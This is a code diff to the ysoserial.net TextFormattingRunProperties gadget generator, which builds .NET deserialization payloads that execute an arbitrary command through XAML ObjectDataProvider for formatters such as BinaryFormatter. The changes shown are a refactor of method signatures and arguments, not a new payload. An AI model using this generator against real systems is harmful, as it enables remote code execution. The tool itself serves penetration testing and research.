@@ -39,14 +39,14 @@ namespace ysoserial.Generators
             return "TextFormattingRunProperties gadget";
         }
 
-        public override string Credit()
+        public override string Finders()
         {
             return "Oleksandr Mirosh and Alvaro Munoz";
         }
 
-        public override bool isDerived()
+        public override List<string> Labels()
         {
-            return true;
+            return new List<string> { GadgetTypes.NotBridgeButDervied };
         }
 
         public override List<string> SupportedFormatters()
@@ -54,7 +54,7 @@ namespace ysoserial.Generators
             return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "NetDataContractSerializer", "LosFormatter" };
         }
 
-        public override object Generate(string cmd, string formatter, Boolean test, Boolean minify, Boolean useSimpleType)
+        public override object Generate(string formatter, InputArgs inputArgs)
         {
             // commented for future reference (research purposes)
             /*
@@ -111,21 +111,25 @@ namespace ysoserial.Generators
     </ObjectDataProvider>
 </ResourceDictionary>";
             */
-            return Serialize(TextFormattingRunPropertiesGadget(cmd, minify, useSimpleType), formatter, test, minify);
+            return Serialize(TextFormattingRunPropertiesGadget(inputArgs), formatter, inputArgs);
         }
 
         /* this can be used easily by the plugins as well */
+
+        // This is for those plugins that only accepts cmd and do not want to use any of the input argument features such as minification
         public static object TextFormattingRunPropertiesGadget(string cmd)
         {
-            return TextFormattingRunPropertiesGadget(cmd, false, false);
+            InputArgs inputArgs = new InputArgs();
+            inputArgs.CmdFullString = cmd;
+            return TextFormattingRunPropertiesGadget(inputArgs);
         }
 
-        public static object TextFormattingRunPropertiesGadget(string cmd, bool minify, Boolean useSimpleType)
+        public static object TextFormattingRunPropertiesGadget(InputArgs inputArgs)
         {
             ObjectDataProviderGenerator myObjectDataProviderGenerator = new ObjectDataProviderGenerator();
-            string xaml_payload = myObjectDataProviderGenerator.Generate(cmd, "xaml", false, minify, useSimpleType).ToString();
+            string xaml_payload = myObjectDataProviderGenerator.GenerateWithNoTest("xaml", inputArgs).ToString();
 
-            if (minify)
+            if (inputArgs.Minify)
             {
                 xaml_payload = XMLMinifier.Minify(xaml_payload, null, null);
             }
